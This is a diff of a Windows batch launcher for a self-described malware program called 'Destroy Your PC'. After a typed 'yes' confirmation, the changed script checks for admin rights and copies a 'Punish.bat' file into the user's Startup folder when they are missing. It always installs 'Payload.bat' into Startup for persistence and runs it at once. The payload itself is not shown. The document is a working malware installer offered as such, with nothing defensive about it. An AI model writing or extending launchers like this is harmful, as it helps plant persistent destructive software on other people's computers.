@@ -1,10 +1,11 @@
 @echo off
-title Destroy Your PC Launcher
+title Destroy Your PC - Launcher
 color 0C
 
-echo WARNING: You are about to run Destroy Your PC. Made by Klaas2811. IT IS A MALWARE!
-echo It will install the payload and activate it after reboot.
+echo WARNING: You are about to run Destroy Your PC. IT IS A MALWARE!
+echo It will install the payload and may activate consequences based on your choice.
 echo.
+
 set /p answer=Are you sure? Type "yes" to continue: 
 
 if /i not "%answer%"=="yes" (
@@ -13,11 +14,23 @@ if /i not "%answer%"=="yes" (
     exit
 )
 
-echo Installing payload...
-copy "%~dp0payload.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat" >nul
+:: === ADMIN CHECK ===
+net session >nul 2>&1
+if %errorlevel% NEQ 0 (
+    echo [!] No admin rights! Punish will be added to Startup...
+    copy "%~dp0Punish.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Punish.bat" >nul
+) else (
+    echo [+] Admin rights detected. Removing Punish if it exists...
+    del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Punish.bat" >nul 2>&1
+)
 
+:: === ALWAYS PUT PAYLOAD IN STARTUP ===
+echo [*] Installing payload to Startup...
+copy "%~dp0Payload.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Payload.bat" /Y >nul
+
+:: === ALWAYS RUN PAYLOAD ===
 echo.
-echo Payload installed successfully.
-echo Rebooting system to activate it...
-shutdown -r -t 3 -c "Destroy Your PC is now active"
+echo Launching payload...
+start "" "%~dp0Payload.bat"
+
 exit
